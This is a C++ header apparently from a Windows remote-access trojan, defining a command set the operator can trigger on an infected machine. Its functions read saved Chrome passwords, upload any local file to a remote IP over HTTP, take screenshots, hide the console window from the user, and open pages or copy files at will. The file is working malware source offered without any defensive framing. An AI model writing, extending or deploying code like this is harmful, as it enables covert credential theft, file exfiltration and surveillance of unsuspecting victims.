#pragma once
#include "HttpRequest.h"
#include "Screenshotmaker.h"
#include <fstream>
#include <shlobj.h>
#include <exdisp.h>
#include "chromePasswords.h"

class Commands final
{
	static void PlayWavFile(std::string f, bool complete)
	{
		/*
		SND_SYNC will not return until the sound completes.
		SND_ASYNC will return immediately and play the sound
		in the background.
		*/

		PlaySound(std::wstring(f.begin(), f.end()).c_str(), NULL,
			SND_FILENAME | (complete ? SND_SYNC : SND_ASYNC));
	}
public:
	static bool saveScreenshot(std::string path)
	{
		auto screenshot = ScreenshotMaker::makeScreenshot();
		return ScreenshotMaker::saveScreenshot(screenshot, path);
	}
	static void postFile(std::string ip, std::string path, std::string type)
	{
		std::ifstream file(path, std::ios::binary | std::ios::in);
		std::vector<unsigned char> data(std::istreambuf_iterator<char>(file), {});
		
		HTTPRequest::postRequest(ip, type+"#", data);
	}
	static void show()
	{
		::ShowWindow(::GetConsoleWindow(), SW_SHOW);
	}
	static void hide()
	{
		::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}
	static void playSound(std::string path)
	{
		PlayWavFile(path, false);
	}
	static void minimiseAll()
	{
		// Initialize the use of COM objects...
		CoInitialize(NULL);

		// Create a Shell object pointer...
		IShellDispatch* pShell = NULL;
		HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_SERVER, IID_IDispatch, (void**)&pShell);

		if (SUCCEEDED(hr))
		{
			// Call the MinimizeAll() shell function...
			pShell->MinimizeAll();

			// Release the COM object when we're finished...
			pShell->Release();
		}

		CoUninitialize();
	}
	static void copy(std::string from, std::string to)
	{
		CopyFile(std::wstring(from.begin(), from.end()).c_str(),
			std::wstring(to.begin(), to.end()).c_str(), FALSE);
	}
	static void openPage(std::string address)
	{
		ShellExecute(0, 0, std::wstring(address.begin(), address.end()).c_str(), 0, 0, SW_SHOW);
	}
	static void crankChromeDB()
	{
		readpasswords();
	}
};